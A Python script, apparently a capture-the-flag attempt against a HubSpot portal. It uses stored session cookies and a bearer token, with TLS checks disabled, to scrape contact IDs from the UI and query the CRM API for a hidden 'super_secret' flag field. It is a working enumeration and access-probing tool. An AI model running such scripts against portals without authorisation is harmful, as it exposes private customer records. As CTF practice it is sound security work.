#!/usr/bin/env python3
"""
Extract contact IDs from the accessible UI page
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import re

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("EXTRACTING CONTACTS FROM UI")
print("="*80)

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# The contacts list page that returned 200!
contacts_url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/views/all/list'

print(f"\nFetching: {contacts_url}")

r = session.get(contacts_url, verify=False, timeout=10)

print(f"Status: {r.status_code}")
print(f"Size: {len(r.text)} bytes")

if r.status_code == 200:
    # Save the page
    with open('findings/contacts_list_ui.html', 'w') as f:
        f.write(r.text)

    print("\nSaved to findings/contacts_list_ui.html")

    # Extract contact IDs using multiple patterns
    patterns = [
        r'/contact/(\d+)',
        r'/record/0-1/(\d+)',
        r'"contactId"\s*:\s*"?(\d+)"?',
        r'"hs_object_id"\s*:\s*"?(\d+)"?',
        r'"id"\s*:\s*"?(\d+)"?',
    ]

    all_contact_ids = set()

    for pattern in patterns:
        matches = re.findall(pattern, r.text)
        all_contact_ids.update(matches)

    unique_ids = sorted(list(all_contact_ids), key=int) if all_contact_ids else []

    print(f"\nFound {len(unique_ids)} unique contact IDs:")

    for contact_id in unique_ids[:50]:  # Show first 50
        print(f"  {contact_id}")

    if unique_ids:
        print(f"\n{'='*80}")
        print("ATTEMPTING TO ACCESS CONTACTS VIA API")
        print('='*80)

        # Try to access each contact via API
        for contact_id in unique_ids[:10]:  # Try first 10
            print(f"\nContact {contact_id}:")

            fetch_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?properties=firstname,super_secret,email'

            try:
                r2 = session.get(fetch_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=5)

                print(f"  API Status: {r2.status_code}")

                if r2.status_code == 200:
                    print(f"  *** ACCESSIBLE VIA API! ***")

                    try:
                        data = r2.json()
                        print(f"  Data: {json.dumps(data, indent=2)}")

                        # Check for super_secret
                        props = data.get('properties', {})

                        if 'super_secret' in props:
                            print(f"\n{'='*80}")
                            print("*** CTF FLAG FOUND! ***")
                            print('='*80)
                            print(f"Contact ID: {contact_id}")
                            print(f"Firstname: {props.get('firstname', 'N/A')}")
                            print(f"Super Secret: {props.get('super_secret', 'N/A')}")
                            print(f"Email: {props.get('email', 'N/A')}")

                            with open('/home/user/Hub/findings/CTF_FLAG_FOUND.json', 'w') as f:
                                json.dump(data, f, indent=2)

                            print(f"\nSaved to findings/CTF_FLAG_FOUND.json")
                    except:
                        print(f"  Response: {r.text[:200]}")
                elif r2.status_code == 404:
                    print(f"  Not found via API")
                else:
                    print(f"  Error: {r2.status_code}")
            except:
                pass

    # Also try to extract data directly from the HTML
    print(f"\n{'='*80}")
    print("SEARCHING FOR EMBEDDED DATA IN HTML")
    print('='*80)

    # Look for JSON data embedded in the page
    json_pattern = r'<script[^>]*>.*?({[\s\S]*?})</script>'
    json_matches = re.findall(json_pattern, r.text)

    for i, json_str in enumerate(json_matches[:10], 1):
        if 'firstname' in json_str.lower() or 'super_secret' in json_str.lower():
            print(f"\n[JSON Block {i}] Contains contact keywords:")

            try:
                data = json.loads(json_str)
                print(json.dumps(data, indent=2)[:800])

                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n*** MAY CONTAIN CTF FLAG! ***")

                    with open(f'findings/embedded_json_{i}.json', 'w') as f:
                        json.dump(data, f, indent=2)
            except:
                # Not valid JSON, check as text
                if 'super_secret' in json_str.lower():
                    print(json_str[:500])
else:
    print(f"\nCould not access contacts list page (status: {r.status_code})")
